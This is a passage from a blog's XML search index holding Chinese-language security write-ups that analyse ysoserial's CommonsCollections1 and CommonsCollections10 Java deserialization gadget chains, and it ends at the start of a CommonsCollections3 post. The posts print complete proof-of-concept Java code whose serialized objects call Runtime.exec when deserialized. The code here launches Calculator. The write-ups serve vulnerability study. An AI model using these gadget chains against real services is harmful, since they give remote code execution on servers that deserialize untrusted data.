        <tag>WebLogic</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial分析之CommonsCollections1</title>
    <url>/2020/04/20/ysoserial-analyze-1/</url>
    <content><![CDATA[<p>在上一篇<a href="https://ananaskr.github.io/2020/04/20/common-collections/" target="_blank" rel="noopener">文章</a>中，分析了使用commons-collections用来进行RCE的原理。那么在实际情况中，需要找到一个反序列化链来RCE。这篇文章分析的就是CommonsCollections1。让我们来看看它是如何构造反序列化链的。</p>
<a id="more"></a>

<p>需要找到一个符合一下条件的类，并且在服务端有反序列化的入口，就可以RCE了。</p>
<ul>
<li>该类重写了readObject方法</li>
<li>该类的readObject方法中操作了<code>TransformedMap</code>，比如调用setValue、put、putAll</li>
</ul>
<p>搜索了一下调用<code>transform</code>的位置，最有可能被利用的就是LazyMap.get、TransformedMap.checkSetValue，其中checkSetValue会在Entry.setValue函数被调用的时候调用。定位到TransformedMap的父类<code>AbstractInputCheckedMapDecorator</code>中的<code>MapEntry</code>类的<code>setValue</code>方法:</p>
<p><img src="1.png" alt=""></p>
<p>可以看到调用了checkSetValue方法。因此需要在被重载的readObject函数中发现相关可控Map数据的操作(LazyMap.get和Entry.setValue)。对应的对于CommonsCollections1有了2种利用链。</p>
<h1 id="01-TransformedMap-checkSetValue"><a href="#01-TransformedMap-checkSetValue" class="headerlink" title="01 TransformedMap.checkSetValue"></a>01 TransformedMap.checkSetValue</h1><p>先来看第一种，利用<code>TransformedMap.checkSetValue</code>。整个的利用链如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-&gt;AnnotationInvocationHandler.readObject()</span><br><span class="line">  -&gt;TransformedMap.entrySet().iterator().next.setValue()</span><br><span class="line">    -&gt;TransformedMap.checkSetValue()</span><br><span class="line">      -&gt;TransformedMap.transform()</span><br><span class="line">		  -&gt;ChainedTransformer.transform()</span><br><span class="line">		    -&gt;ConstantTransformer.transform()</span><br><span class="line">			   -&gt;InvokerTransformer.transform()</span><br><span class="line">				  -&gt;Method.invoke()</span><br><span class="line">				    -&gt;Class.getMethod()</span><br><span class="line">			   -&gt;InvokerTransformer.transform()</span><br><span class="line">				  -&gt;Method.invoke()</span><br><span class="line">				    -&gt;Runtime.getRuntime()</span><br><span class="line">			   -&gt;InvokerTransformer.transform()</span><br><span class="line">				  -&gt;Method.invoke()</span><br><span class="line">				    -&gt;Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>利用条件:  </p>
<ul>
<li>&lt;= JRE 8u72</li>
<li>commonscollections:3.1, 3.2, 3.2.1</li>
</ul>
<p>参考:<a href="http://www.thegreycorner.com/2016/05/commoncollections-deserialization.html" target="_blank" rel="noopener">CommonsCollections deserialization attack payloads from ysoserial failing</a></p>
<p>commonscollections:3.2.2中对不安全的Java类的反序列化增加了开关，默认为关闭状态。比如InvokerTransformer。</p>
<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>CommonsCollections1反序列化调用链最外层利用的是<code>AnnotationInvocationHandler</code>类(sub.reflect.annotation.AnnotationInvocationHandler)。它实现了<code>java.lang.reflect.InvocationHandler</code>(Java动态代理)接口和<code>java.io.Serializable</code>接口。</p>
<p>首先定位到<code>AnnotationInvocationHandler</code>类的readObject函数。可以看到在readObject函数中361行调用了setValue方法且是在Entry中调用的，Entry var5又来自<code>this.memberValues.entrySet().iterator()</code>。</p>
<p><img src="1-1.png" alt=""></p>
<p>因此当获取到this.memberValues为TransformedMap时，就调用了Entry.setValue，从而到了TransformedMap.checkSetValue方法</p>
<p><img src="2.png" alt=""></p>
<p>看到checkSetValue方法中的<code>this.valueTransformer.transform(value)</code>就到了熟悉的Transformer了。到这里整个利用链就结束了。</p>
<p>memberValues是<code>AnnotationInvocationHandler</code>的成员变量，memberValues的值是在<code>var1.defaultReadObject()</code>时反序列化生成的。可以通过在<code>var1.defaultReadObject()</code>下断点，进入<code>defaultReadObject()</code>函数中，在经过<code>defaultReadFields()</code>后，memberValues值被赋为传入的<code>TransformedMap</code>如下图所示:</p>
<p><img src="1-2.png" alt=""></p>
<h2 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h2><p>首先实例化出一个TransformedMap对象，其中<code>this.valueTransformer</code>为构造的TransformedChain对象。代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(<span class="string">"value"</span>,<span class="string">"value"</span>);</span><br><span class="line">Map transformedMap = TransformedMap.decorate(map,<span class="keyword">null</span>,transformedChain);</span><br></pre></td></tr></table></figure>

<p>然后在AnnotationInvocationHandler对象反序列化时需要使得<code>this.memberValue</code>为TransformedMap对象。看一下AnnotationInvocationHandler的构造函数。</p>
<p><img src="3.png" alt=""></p>
<p>传入一个注解类以及Map类。创建AnnotationInvocationHandler对象。因为<code>AnnotationInvocationHandler</code>是一个内部API专用的类，在外部无法通过类名创建实例，需要通过反射的方式创建出<code>AnnotationInvocationHandler</code>对象。代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forname(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line"></span><br><span class="line">Constructor constructor = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">Object instance = constructor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">transformedMap</span>)</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>创建时map的key名称必须对应创建AnnotationInvocationHandler时使用的注解方法名。比如创建AnnotationInvocationHandler时传入的注解是<code>java.lang.annotation.Target</code>，那么map的key必须是@Target注解中的方法名，即: value。至于为什么传入Target注解而不是其他注解，传入其他注解如@Retention也可以，@Retention注解中的方法名也是value。</p>
</blockquote>
<p>通过分析可知，在<code>readObject()</code>函数中，Map类型的var3是key为value，值为class。在357行中，若var6的值为”ananaskr”，而不是”value”，获取到的var7为空。从而在后面的if判断中，无法进入setValue的执行。</p>
<p><img src="1-3.png" alt=""></p>
<h3 id="完整的攻击demo"><a href="#完整的攻击demo" class="headerlink" title="完整的攻击demo"></a>完整的攻击demo</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        </span><br><span class="line">        Transformer transformedChain = <span class="keyword">new</span> ChainedTransformer(transformer);</span><br><span class="line">        </span><br><span class="line">        Map&lt;String,String&gt; beforetransMap = <span class="keyword">new</span> HashMap&lt;String,String&gt;();</span><br><span class="line">        beforetransMap.put(<span class="string">"value"</span>,<span class="string">"value"</span>);</span><br><span class="line">        </span><br><span class="line">        Map transformedMap = TransformedMap.decorate(beforetransMap,transformedChain,transformedChain);</span><br><span class="line">        </span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        </span><br><span class="line">        Constructor ctor = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>,<span class="title">transformedMap</span>)</span>;</span><br><span class="line">        </span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">        </span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line">        System.out.println(Arrays.toString(bytes));</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line"></span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下所示:</p>
<p><img src="1-4.png" alt=""></p>
<h1 id="02-LazyMap-get"><a href="#02-LazyMap-get" class="headerlink" title="02 LazyMap.get"></a>02 LazyMap.get</h1><p>此外，能够调用transform方法的还有<code>LazyMap.get</code>方法。在ysoserial中的commonsCollections1中就是利用这种方式产生payload。那么如何调用LazyMap.get方法呢？这里利用到了<code>AnnotationInvocationHandler.invoke</code>函数。先来看看整个的反序列化利用链:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-&gt;AnnotationInvocationHandler.readObject()</span><br><span class="line">  -&gt;this.memberValues.entrySet().iterator()</span><br><span class="line">	 -&gt;LazyMap.get()</span><br><span class="line">		-&gt;this.factory.transform(key)</span><br><span class="line">		  -&gt;ChainedTransformer.transform()</span><br><span class="line">			 -&gt;ConstantTransformer.transform()</span><br><span class="line">			 -&gt;InvokerTransformer.transform()</span><br><span class="line">				-&gt;Method.invoke()</span><br><span class="line">				  -&gt;Class.getMethod()</span><br><span class="line">			 -&gt;InvokerTransformer.transform()</span><br><span class="line">				-&gt;Method.invoke()</span><br><span class="line">				  -&gt;Runtime.getRuntime()</span><br><span class="line">			 -&gt;InvokerTransformer.transform()</span><br><span class="line">				-&gt;Method.invoke()</span><br><span class="line">				  -&gt;Runtime.exec()</span><br></pre></td></tr></table></figure>


<h2 id="利用链分析-1"><a href="#利用链分析-1" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>既然利用的是<code>AnnotationInvocationHandler.invoke</code>函数，那么就来看看这个函数</p>
<p><img src="1-5.png" alt=""></p>
<p>可以看到78行<code>this.memberValues.get(var4)</code>，当memberValues为LazyMap即可调用transform方法。LazyMap.get函数如下所示:</p>
<p><img src="4.png" alt=""></p>
<p>但是如何调用invoke函数呢，在这里就介绍到了Java中的Proxy动态代理机制，在该机制下被代理的实例不管调用什么类方法，都会先调用invoke方法。关于<a href="">动态代理</a>的详细介绍自行查看。</p>
<p>现在只需要找一个调用Map的任何方法地方，还是定位在AnnotationInvocationHandler类的readObject函数。</p>
<p><img src="5.png" alt=""></p>
<p>看到352行中，对Map对象调用了entrySet方法，因此只需要使得this.memberValues为构造好的动态代理Map类即可。到这里整个利用链分析就结束了。</p>
<h2 id="payload构造-1"><a href="#payload构造-1" class="headerlink" title="payload构造"></a>payload构造</h2><p>Transformer链前面分析过，这里从构造LazyMap对象开始。构造LazyMap对象的代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map lazyMap = LazyMap.decorate(beforetransMap,transformedChain);</span><br></pre></td></tr></table></figure>

<p>然后是构造动态代理类，主要的中心思想是使用AnnotationInvocationHandler代理目标LazyMap对象。传入被代理的目标，实例化AnnotationInvocationHandler。最后借助Proxy类的newProxyInstance方法来动态生成代理类。代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassLoader classLoader = lazyMap.getClass().getClassLoader();</span><br><span class="line">Class[] interfaces = lazyMap.getClass().getInterfaces();</span><br><span class="line">        </span><br><span class="line">Constructor ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"> InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">lazyMap</span>)</span>;</span><br><span class="line">        </span><br><span class="line">Map mapProxy = (Map)Proxy.newProxyInstance(classLoader, interfaces, handler);</span><br></pre></td></tr></table></figure>

<p>到这里动态代理类对象mapProxy就构造完了，最后实例化AnnotationInvocationHandler类，传入动态代理类对象mapProxy。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">       Constructor ctorr = clazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">       ctorr.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       Object instance1 = ctorr.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">mapProxy</span>)</span>;</span><br></pre></td></tr></table></figure>


<h3 id="完整的攻击demo-1"><a href="#完整的攻击demo-1" class="headerlink" title="完整的攻击demo"></a>完整的攻击demo</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformedChain = <span class="keyword">new</span> ChainedTransformer(transformer);</span><br><span class="line">        Map&lt;String,String&gt; beforetransMap = <span class="keyword">new</span> HashMap&lt;String,String&gt;();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(beforetransMap,transformedChain);</span><br><span class="line">        ClassLoader classLoader = lazyMap.getClass().getClassLoader();</span><br><span class="line">        Class[] interfaces = lazyMap.getClass().getInterfaces();</span><br><span class="line"></span><br><span class="line">        Constructor ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">lazyMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Map mapProxy = (Map)Proxy.newProxyInstance(classLoader, interfaces, handler);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctorr = clazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctorr.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance1 = ctorr.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">mapProxy</span>)</span>;</span><br><span class="line">        </span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        out.writeObject(instance1);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下:</p>
<p><img src="1-6.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections1</a></li>
<li><a href="https://javasec.org/javase/JavaDeserialization/Collections.html" target="_blank" rel="noopener">Apache Commons Collections反序列化漏洞</a></li>
<li><a href="https://www.smi1e.top/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%ad%a6%e4%b9%a0%e4%b9%8bapache-commons-collections/" target="_blank" rel="noopener">Java反序列化学习之Apache Commons Collections</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial分析之CommonsCollecions10</title>
    <url>/2020/04/28/ysoserial-analyze-10/</url>
    <content><![CDATA[<p>这篇文章分析的是CommonsCollections10，这是<a href="https://github.com/wh1t3p1g" target="_blank" rel="noopener">wh1t3p1g</a>师傅提出来的，这篇文章分析分析它用到了哪个新的点。</p>
<a id="more"></a>

<p>前面已经分析了:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-4/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections4</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-5/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections5</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-6/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections6</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-7/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections7</a><br><a href="https://ananaskr.github.io/2020/04/28/ysoserial-analyze-8/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections8</a><br><a href="https://ananaskr.github.io/2020/04/28/ysoserial-analyze-9/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections9</a></p>
<p>wh1t3p1g师傅提出的CommonsCollections10主要是结合了CommonsCollection6，7。在Hashtable的reconstitutionPut函数中找到利用hashcode方法来触发TiedMapEntry.getValue方法，从而触发LazyMap.get方法的点。整个反序列链如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hashtable.readObject()</span><br><span class="line">  -&gt;Hashtable.reconstitutionPut()</span><br><span class="line">    -&gt;TiedMapEntry.hashCode()</span><br><span class="line">      -&gt;TiedMapEntry.getValue()</span><br><span class="line">        -&gt;LazyMap.get()</span><br><span class="line">          -&gt;ChainedTransformer.transform()</span><br><span class="line">            -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>

<h2 id="利用链分析及构造"><a href="#利用链分析及构造" class="headerlink" title="利用链分析及构造"></a>利用链分析及构造</h2><p>最外层还是还是使用Hashtable触发了readObject函数，接着进入reconstitutionPut函数，看看这个函数。</p>
<p><img src="1.png" alt=""></p>
<p>可以看到了调用了hashCode()函数。而在前面提到过，TiedMapEntry类的触发getValue函数有toString、hashCode以及equals。这里是hashCode。所以，这里的key是TiedMapEntry对象。首先是构造TiedMapEntry对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">               <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">               new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">               new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">               new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line"></span><br><span class="line">       &#125;;</span><br><span class="line"></span><br><span class="line">       ChainedTransformer transformer  = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">       Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">       Map lazyMap = LazyMap.decorate(map,transformer);</span><br><span class="line"></span><br><span class="line">       TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>然后实例化一个Hashtable，放入元素后，获取Hashtable的table属性，然后获取table中的Entry的key属性，将key属性设置为TiedMapEntry对象即可。代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">hashtable.put(<span class="string">"foo"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Field field = hashtable.getClass().getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">Object[] table = (Object[]) field.get(hashtable);</span><br><span class="line">Object entry = table[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> (entry==<span class="keyword">null</span>)&#123;</span><br><span class="line">       entry = table[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Field keyfield = entry.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">keyfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">keyfield.set(entry,tiedMapEntry);</span><br></pre></td></tr></table></figure>

<p>完整的demo如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer transformer  = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(map,transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashtable.put(<span class="string">"foo"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Field field = hashtable.getClass().getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Object[] table = (Object[]) field.get(hashtable);</span><br><span class="line">        Object entry = table[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (entry==<span class="keyword">null</span>)&#123;</span><br><span class="line">            entry = table[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field keyfield = entry.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        keyfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        keyfield.set(entry,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(hashtable);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果如下:</p>
<p><img src="2.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://blog.0kami.cn/2019/10/31/study-java-deserialized-commonscollections3-others/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections5,6,7,9,10</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial分析之CommonsCollections3</title>
    <url>/2020/04/23/ysoserial-analyze-3/</url>
    <content><![CDATA[<p>在分析完CommonsCollections1之后，紧接着分析了CommonsCollections3。为什么是3呢？因为3和1都是需要JDK版本一样，而且payload构造的前半部分完全一样，不同的只是chainedTransformer的构造。</p>
<a id="more"></a>
<p>前面已经分析了:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a></p>
<p>CommonsCollections3从外层和CommonsCollections1一样都是从AnnotationInvocationHandler的readObject函数进入的。进入之后调用到了LazyMap.get()方法，从而调用到ChainedTranformer.transform()方法。</p>
